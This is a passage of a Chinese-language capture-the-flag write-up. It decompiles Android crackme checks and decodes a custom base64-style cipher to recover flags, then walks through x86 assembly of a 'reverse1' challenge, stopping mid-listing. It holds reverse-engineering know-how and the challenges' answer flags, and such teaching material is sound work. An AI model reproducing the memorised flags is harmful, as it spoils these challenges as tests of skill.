+    <span class="token comment">//  数组的值是：}lag{3l3cte9rAhc_c1rf</span>
+    <span class="token keyword">int</span> v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token operator">=</span> arg10<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>arg10 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> arg11 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> v0<span class="token punctuation">[</span>arg10<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> v5<span class="token punctuation">[</span>arg10<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> v0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            v2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">int</span> v1<span class="token punctuation">;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span>v1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> v1 <span class="token operator">&lt;</span> arg10<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>v1<span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">!=</span> v0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token punctuation">{</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>v1 <span class="token operator">==</span> arg10<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token punctuation">{</span>
+                v3 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">while</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;</span> arg10<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">!=</span> v0<span class="token punctuation">[</span>arg10<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> v1<span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token punctuation">{</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token operator">++</span>v1<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token keyword">return</span> v2 <span class="token operator">&amp;</span> v3<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> arg5<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token class-name">String</span> v0 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>editText<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span>v0<span class="token punctuation">,</span> v0<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;It\'s not smell good!&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">{</span>
+        <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;Good, you got it!&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br></div></div><p>为得到flag，只要check返回1就行，即在check中v2和v3都是1，发现check只是进行简单的替换，将最后一位和第一位替换。还原只要将}lag{3l3cte9rAhc_c1rf中第一位和最后一位对调即可，当然，长度相同也行，只要第一位是f，最后一位是}。这时候v2=1，而此时v3根据程序的推进必等于1，所以得到flag。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>flag<span class="token punctuation">{</span>3l3cte9rAhc_c1r<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="助人为乐"><a href="#助人为乐" class="header-anchor">#</a> 助人为乐</h3> <p>这题，和第一题一样，我直接用Jeb分析了，Android_Killer同样失效了。程序的关键部分如下：</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">int</span> v11 <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> v10 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>password <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> password<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
+			<span class="token punctuation">{</span>
+            <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> pass <span class="token operator">=</span> password<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">StringBuilder</span> v2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> i<span class="token punctuation">;</span>
+            <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pass<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token class-name">String</span> v0<span class="token punctuation">;</span>
+                <span class="token keyword">for</span><span class="token punctuation">(</span>v0 <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toBinaryString</span><span class="token punctuation">(</span>pass<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> v0<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> v0 <span class="token operator">=</span> <span class="token string">&quot;0&quot;</span> <span class="token operator">+</span> v0<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token punctuation">}</span>
+
+                v2<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">while</span><span class="token punctuation">(</span>v2<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                v2<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">&quot;0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token class-name">String</span> v1 <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> v4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span>v1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v4<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v11<span class="token punctuation">)</span><span class="token punctuation">,</span> v10<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                v1 <span class="token operator">=</span> v1<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Code</span><span class="token punctuation">.</span><span class="token class-name">CodeText</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token class-name">StringBuilder</span> v3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>password<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                v3<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>password<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> v10<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                v3<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">&quot;23&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">76</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v3<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">76</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                v3<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">&quot;\r\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            v3<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">&quot;\r\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            password <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> password<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br></div></div><p>这其中有两个列表，一个是加密列表：（长度为64=2^6）</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<span class="token operator">!</span>@<span class="token comment">#\$%^&amp;*()+/</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>另一个是密文：</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>zMXHz<span class="token variable">$SXDf</span><span class="token punctuation">)</span>SC@<span class="token punctuation">)</span>UB<span class="token variable">$rFyv</span><span class="token punctuation">)</span>Jmg@<span class="token variable">$zw</span>^FyMfZzwnVzeuHFq1
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>本题就是要求我们解密出明文。加密过程大致如下：首先将输入的字符串对应的ascii码转换成二进制，每一字符是8bit，得到一串比特流。之后检测总长度是否为6的倍数，不是的话在后面补0，之后将比特流每6个一组，得到一串数字，数字均小于63(2^6-1)，将这串数字作为加密列表的下标查找对应字符，实现加密。
+所以解法如下： 首先查找密文每一位在加密列表中的下标。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">char</span> pass<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;zMXHz$SXDf)SC@)UB$rFyv)Jmg@$zw^FyMfZzwnVzeuHFq1&quot;</span><span class="token punctuation">;</span>
+	<span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&amp;*()+/&quot;</span><span class="token punctuation">;</span>
+	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">47</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+	<span class="token punctuation">{</span>
+		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">65</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
+		<span class="token punctuation">{</span>
+			<span class="token keyword">if</span> <span class="token punctuation">(</span>pass<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> name<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
+			<span class="token punctuation">{</span>
+				cout <span class="token operator">&lt;&lt;</span> j <span class="token operator">&lt;&lt;</span> <span class="token string">&quot; &quot;</span><span class="token punctuation">;</span>
+				<span class="token keyword">break</span><span class="token punctuation">;</span>
+			<span class="token punctuation">}</span>
+			<span class="token keyword">else</span>
+				<span class="token keyword">continue</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+	 <span class="token punctuation">}</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>得到的即为下标：</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token number">25</span> <span class="token number">38</span> <span class="token number">49</span> <span class="token number">33</span> <span class="token number">25</span> <span class="token number">55</span> <span class="token number">44</span> <span class="token number">49</span> <span class="token number">29</span> <span class="token number">5</span> <span class="token number">61</span> <span class="token number">44</span> <span class="token number">28</span> <span class="token number">53</span> <span class="token number">61</span> <span class="token number">46</span> <span class="token number">27</span> <span class="token number">55</span> <span class="token number">17</span> <span class="token number">31</span> <span class="token number">24</span> <span class="token number">21</span> <span class="token number">61</span> <span class="token number">35</span> <span class="token number">12</span> <span class="token number">6</span> <span class="token number">53</span> <span class="token number">55</span> <span class="token number">25</span> <span class="token number">22</span> <span class="token number">57</span> <span class="token number">31</span> <span class="token number">24</span> <span class="token number">38</span> <span class="token number">5</span> <span class="token number">51</span> <span class="token number">25</span> <span class="token number">22</span> <span class="token number">13</span> <span class="token number">47</span> <span class="token number">25</span> <span class="token number">4</span> <span class="token number">20</span> <span class="token number">33</span> <span class="token number">31</span> <span class="token number">16</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>再转成二进制，注意补0对齐，6个一组。再去掉空格连起来。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>011001 <span class="token number">100110</span> <span class="token number">110001</span> <span class="token number">100001</span> 011001 <span class="token number">110111</span> <span class="token number">101100</span> <span class="token number">110001</span> 011101 000101 <span class="token number">111101</span> <span class="token number">101100</span> 011100 <span class="token number">110101</span> <span class="token number">111101</span> <span class="token number">101110</span> 011011 <span class="token number">110111</span> 010001 011111 011000 010101 <span class="token number">111101</span> <span class="token number">100011</span> 001100 000110 <span class="token number">110101</span> <span class="token number">110111</span> 011001 010110 <span class="token number">111001</span> 011111 011000 <span class="token number">100110</span> 000101 <span class="token number">110011</span> 011001 010110 001101 <span class="token number">101111</span> 011001 000100 010100 <span class="token number">100001</span> 011111 010000
+-<span class="token operator">&gt;</span>011001100110110001100001011001110111101100110001011101000101111101101100011100110101111101101110011011110111010001011111011000010101111101100011001100000110110101110111011001010110111001011111011000100110000101110011011001010110001101101111011001000100010100100001011111010000
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>之后再8个一组，作为字符，查ascii表。得到flag。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>01100110 01101100 01100001 01100111 01111011 00110001 01110100 01011111 01101100 01110011 01011111 01101110 01101111 01110100 01011111 01100001 01011111 01100011 00110000 01101101 01110111 01100101 01101110 01011111 01100010 01100001 01110011 01100101 01100011 01101111 01100100 01000101 00100001 01111101 000
+-<span class="token operator">&gt;</span>flag<span class="token punctuation">{</span>1t_ls_not_a_c0mwen_basecodE<span class="token operator">!</span><span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="reverse"><a href="#reverse" class="header-anchor">#</a> REVERSE</h2> <h3 id="reverse1"><a href="#reverse1" class="header-anchor">#</a> reverse1</h3> <p>别想多了，这题就是看汇编。（哭）
+第一步：首先判断输入字符串长度是否为0x1C。用ecx作为累加器，一次处理一个字节，累加和与1Ch作比较，相等则跳转。之后判断最后一位是否是}，是则call eax 进行下一步加密。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>mov     al, <span class="token punctuation">[</span>ecx<span class="token punctuation">]</span>
+inc     ecx
+<span class="token builtin class-name">test</span>    al, al
+jnz     short loc_401030
+sub     ecx, edx
+<span class="token function">cmp</span>     ecx, 1Ch
+jz      short loc_40104B
+…………
+<span class="token function">cmp</span>     <span class="token punctuation">[</span>ebp+var_49<span class="token punctuation">]</span>, <span class="token string">'}'</span>
+jnz     short loc_401070
+…………
+lea     eax, <span class="token punctuation">[</span>ebp+var_64<span class="token punctuation">]</span>
+push    offset byte_403068
+push    eax
+mov     eax, offset loc_403020
+call    eax <span class="token punctuation">;</span> loc_403020
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>第二步：执行 call eax，之后，来到一段数据区，显然实际为代码，手动转成代码后，进行以下逻辑判断。即判断输入的前5个字符是否为flag{，是就进行call edx 下一轮加密。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token function">cmp</span>     byte ptr <span class="token punctuation">[</span>eax<span class="token punctuation">]</span>, <span class="token string">'f'</span>
+jnz     short loc_40305F
+<span class="token function">cmp</span>     byte ptr <span class="token punctuation">[</span>eax+1<span class="token punctuation">]</span>, <span class="token string">'l'</span>
+jnz     short loc_40305F
+<span class="token function">cmp</span>     byte ptr <span class="token punctuation">[</span>eax+2<span class="token punctuation">]</span>, <span class="token string">'a'</span>
+jnz     short loc_40305F
+<span class="token function">cmp</span>     byte ptr <span class="token punctuation">[</span>eax+3<span class="token punctuation">]</span>, <span class="token string">'g'</span>
+jnz     short loc_40305F
+<span class="token function">cmp</span>     byte ptr <span class="token punctuation">[</span>eax+4<span class="token punctuation">]</span>, <span class="token string">'{'</span>
+jnz     short loc_40305F
+…………
+push    offset unk_403110
+push    eax
+call    edx
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>第三步：异或加密，注意到此时的基址指针ebp+8为输入的第6位的地址，而ebp-8是一个加密列表所在地址。通过赋值语句，和Intel小段结构，知道加密列表为 98 A4 A9 93。之后的运算表明，从输入的第6位开始和0xCC进行异或，再与加密的每一位依次对比，相等则继续，不等则退出，循环比较次数为4次。由于异或的可逆性，解除这段明文是：The_。最后取ebx+4则是取输入的第10位的地址进行下一轮加密。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>mov     ebx, <span class="token punctuation">[</span>ebp+8<span class="token punctuation">]</span>
+lea     eax, <span class="token punctuation">[</span>ebp-8<span class="token punctuation">]</span>
+push    esi
+push    edi
+xor     edx, edx
+mov     dword ptr <span class="token punctuation">[</span>ebp-8<span class="token punctuation">]</span>, 93A9A498h
+…………
+lea     ecx, <span class="token punctuation">[</span>ebp-8<span class="token punctuation">]</span>
+<span class="token function">add</span>     ecx, esi
+mov     al, <span class="token punctuation">[</span>edi+ecx<span class="token punctuation">]</span>
+xor     al, 0CCh
+<span class="token function">cmp</span>     al, <span class="token punctuation">[</span>ecx<span class="token punctuation">]</span>
+jnz     short loc_4030B9
+inc     esi
+<span class="token function">cmp</span>     esi, <span class="token number">4</span>
+jl      short loc_403088
+…………
+lea     eax, <span class="token punctuation">[</span>ebx+4<span class="token punctuation">]</span>
+push    offset unk_4032A0
+push    eax
+call    ecx
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>第四步：Base64加密，首先进行初始化，初始加密列表为4部分：ABCD
+EFGHIJKLMNOPQRSTUVWXYZ abcdefghijklmnopqrstuvwxyz 0123456789 +/</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>mov     dl, <span class="token string">'A'</span>
+xor     ecx, ecx
+mov     eax, ecx
+…………
+mov     <span class="token punctuation">[</span>ebp+eax-64h<span class="token punctuation">]</span>, dl
+inc     dl
+inc     eax
+<span class="token function">cmp</span>     dl, <span class="token string">'Z'</span>
+jle     short loc_40311C
+mov     dl, <span class="token string">'a'</span>
+…………
+mov     <span class="token punctuation">[</span>ebp+eax-64h<span class="token punctuation">]</span>, dl
+inc     dl
+inc     eax
+<span class="token function">cmp</span>     dl, <span class="token string">'z'</span>
+jle     short loc_40312A
+mov     dl, <span class="token string">'0'</span>
+…………
